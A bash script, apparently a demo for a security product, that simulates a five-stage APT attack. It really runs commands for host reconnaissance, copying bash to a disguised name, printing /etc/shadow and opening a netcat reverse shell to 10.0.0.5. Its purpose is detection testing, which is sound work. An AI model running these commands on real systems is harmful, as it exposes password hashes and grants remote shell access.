#!/bin/bash

# ENTCE-X Live Fire Demo Script
# Simulates a 5-Stage Advanced Persistent Threat (APT) Attack
# Do not run this on a production server.

echo -e "\e[31m[!] INITIATING APT SIMULATION SEQUENCE...\e[0m"
sleep 2

echo -e "\n\e[33m[STAGE 1] Discovery & Reconnaissance\e[0m"
echo "> whoami"
whoami > /dev/null
sleep 4

echo "> cat /etc/os-release"
cat /etc/os-release > /dev/null
sleep 4

echo -e "\n\e[33m[STAGE 2] Network Mapping\e[0m"
echo "> curl -s http://ipinfo.io"
curl -s http://ipinfo.io > /dev/null
sleep 4

echo -e "\n\e[33m[STAGE 3] Defense Evasion (Hiding the payload)\e[0m"
echo "> cp /bin/bash /tmp/sys-update-agent"
cp /bin/bash /tmp/sys-update-agent 2>/dev/null
sleep 4

echo -e "\n\e[33m[STAGE 4] Credential Harvesting\e[0m"
echo "> cat /etc/shadow"
cat /etc/shadow 2>/dev/null
sleep 4

echo -e "\n\e[31m[STAGE 5] CRITICAL: Establishing Command & Control (C2) Reverse Shell\e[0m"
echo "> nc -e /bin/bash 10.0.0.5 4444"
nc -e /bin/bash 10.0.0.5 4444 2>/dev/null

echo -e "\n\e[32m[✓] SIMULATION COMPLETE.\e[0m"